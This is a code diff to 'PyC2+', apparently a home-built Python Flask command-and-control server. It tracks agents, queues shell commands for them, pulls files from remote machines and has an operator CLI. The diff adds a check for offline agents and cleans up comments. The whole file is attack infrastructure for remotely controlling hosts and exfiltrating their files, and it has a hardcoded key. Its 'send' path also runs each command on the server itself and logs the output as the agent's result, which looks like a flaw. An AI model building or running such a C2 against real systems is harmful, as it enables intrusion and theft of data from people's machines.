@@ -8,20 +8,20 @@ import subprocess
 import base64
 import os
 import json
-import os
 import platform
 
-# Disable Flask logging in terminal (noise)
+# disable Flask logging in terminal (noise)
 log = logging.getLogger('werkzeug')
 log.disabled = True
 
 app = Flask(__name__)
 app.logger.disabled = True
 
-# CONFIGURATION | improved auth and https in development
-AUTH_KEY = "MySecretKey123"
+# CONFIGURATION
+AUTH_KEY = "MySecretKey123"     # improved auth in development
 HOST = "0.0.0.0"
-PORT = 80
+PORT = 80                       # encrypted traffic (HTTPS) in development
+AGENT_TIMEOUT = 10              # seconds before agent is considered offline
 
 # DATA STORES
 agents = {}          # agent_id -> info
@@ -47,30 +47,23 @@ def run_local(cmd):
 def save_file(agent_id, filename, b64data):
     data = base64.b64decode(b64data)
 
-    # Determine OS-specific Downloads folder
+    # determine OS-specific Downloads folder
     system = platform.system()
     if system == "Windows":
         downloads_dir = os.path.join(os.environ['USERPROFILE'], "Downloads")
     else:
         downloads_dir = os.path.expanduser("~/Downloads")
 
-    # Create subfolder for specific agent
+    # create subfolder for specific agent
     agent_dir = os.path.join(downloads_dir, agent_id)
     os.makedirs(agent_dir, exist_ok=True)
-
-    # Full file path
     filepath = os.path.join(agent_dir, filename)
 
-    # Write the file
+    # write file
     with open(filepath, "wb") as f:
         f.write(data)
 
     return filepath
-
-# Check if agent is still online (every 10 seconds, can be adjusted)
-def agent_online(agent_id):
-    return (time.time() - agents[agent_id]["last_seen"]) < 10
-
 
 # FLASK ENDPOINTS
 @app.route("/register", methods=["POST"])
@@ -79,7 +72,10 @@ def register():
         return "Unauthorized", 401
 
     agent_id = str(uuid.uuid4())
-    agents[agent_id] = {"registered_at": timestamp(), "last_seen": time.time()}  # NEW
+    agents[agent_id] = {
+        "registered_at": timestamp(),
+        "last_seen": time.time()
+    }
     tasks[agent_id] = Queue()
     results[agent_id] = []
 
@@ -94,7 +90,8 @@ def get_task(agent_id):
     if agent_id not in agents:
         return "Unknown agent", 404
 
-    agents[agent_id]["last_seen"] = time.time()  # NEW
+    # update last_seen to detect online agents
+    agents[agent_id]["last_seen"] = time.time()
 
     if not tasks[agent_id].empty():
         return jsonify({"task": tasks[agent_id].get()})
@@ -107,6 +104,10 @@ def send_task(agent_id):
         return "Unauthorized", 401
     if agent_id not in agents:
         return "Unknown agent", 404
+
+    # check if agent is offline
+    if time.time() - agents[agent_id]["last_seen"] > AGENT_TIMEOUT:
+        return "Agent offline", 400
 
     task = request.data.decode()
     tasks[agent_id].put(task)
@@ -122,7 +123,6 @@ def receive_result(agent_id):
 
     content = request.data.decode()
 
-    # Check if this is a file result from agent
     try:
         parsed = json.loads(content)
         if parsed.get("type") == "file":
@@ -144,7 +144,12 @@ def list_agents():
     if not auth_check(request):
         return "Unauthorized", 401
 
-    return jsonify({"agents": list(agents.keys())})
+    # only return agents that have polled recently (online)
+    live_agents = [
+        agent_id for agent_id, info in agents.items()
+        if time.time() - info["last_seen"] <= AGENT_TIMEOUT
+    ]
+    return jsonify({"agents": live_agents})
 
 
 @app.route("/history/<agent_id>", methods=["GET"])
@@ -157,11 +162,10 @@ def history(agent_id):
     return jsonify({"results": results[agent_id]})
 
 
-# CLI 
+# CLI
 def cli():
     time.sleep(1)
 
-    # Print banner
     print("\n" + "="*50)
     print("                 PyC2+ CLI")
     print("="*50)
@@ -171,7 +175,6 @@ def cli():
     last_seen_index = 0
 
     def get_prompt():
-        """Return prompt showing selected agent."""
         if selected:
             return f"\n[PyC2+ | {selected}]> "
         return "\n[PyC2+]> "
@@ -186,7 +189,6 @@ def cli():
         if not cmd:
             continue
 
-        # Help
         if cmd.lower() == "help":
             print("\nAvailable commands:")
             print("  agents                   - list all agents")
@@ -199,32 +201,36 @@ def cli():
             print("  exit                     - quit CLI (server keeps running)\n")
             continue
 
-        # List agents
         if cmd.lower() == "agents":
-            if not agents:
+            live_agents = [
+                agent_id for agent_id, info in agents.items()
+                if time.time() - info["last_seen"] <= AGENT_TIMEOUT
+            ]
+            if not live_agents:
                 print("No agents connected.")
             else:
                 print("\nConnected agents:")
-                for a in agents.keys():
-                    status = "online" if agent_online(a) else "offline"   # NEW
-                    print(f"  {a} [{status}]")
+                for a in live_agents:
+                    print(f"  {a}")
             continue
 
-        # Select agent
         if cmd.startswith("select "):
             agent_id = cmd.split(" ")[1]
-            if agent_id in agents:
+            if agent_id in agents and (time.time() - agents[agent_id]["last_seen"] <= AGENT_TIMEOUT):
                 selected = agent_id
                 last_seen_index = 0
                 print(f"Selected agent: {selected}")
             else:
-                print("Invalid agent ID.")
+                print("Invalid or offline agent ID.")
             continue
 
         # PUT FILE
         if cmd.startswith("put "):
             if not selected:
                 print("Select an agent first.")
+                continue
+            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
+                print("Selected agent is offline.")
                 continue
 
             parts = cmd.split(" ")
@@ -250,6 +256,9 @@ def cli():
             if not selected:
                 print("Select an agent first.")
                 continue
+            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
+                print("Selected agent is offline.")
+                continue
 
             remote_path = cmd[len("get "):]
             payload = json.dumps({"type": "get", "path": remote_path})
@@ -257,27 +266,24 @@ def cli():
             print(f"Requested file: {remote_path}")
             continue
 
-        # Send command
+        # send command
         if cmd.startswith("send "):
             if not selected:
                 print("Select an agent first.")
                 continue
-
-            command = cmd[len("send "):]
-
-            if not agent_online(selected):
-                print("Agent is offline — cannot send command.")
+            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
+                print("Selected agent is offline.")
                 continue
 
+            command = cmd[len("send "):]
             tasks[selected].put(command)
 
             output = run_local(command)
             print(output)
-
             results[selected].append({"timestamp": timestamp(), "result": output})
             continue
 
-        # Show history
+        # show history
         if cmd.lower() == "history":
             if not selected:
                 print("No agent selected.")
@@ -287,10 +293,13 @@ def cli():
                 print(entry["result"])
             continue
 
-        # Live watch
+        # live watch
         if cmd.lower() == "watch":
             if not selected:
                 print("No agent selected.")
+                continue
+            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
+                print("Selected agent is offline.")
                 continue
 
             print(f"\n--- LIVE RESULT FEED ({selected}) ---\n")
@@ -305,7 +314,7 @@ def cli():
                     break
             continue
 
-        # Exit
+        # exit
         if cmd.lower() == "exit":
             print("Leaving CLI. Server still running...")
             break
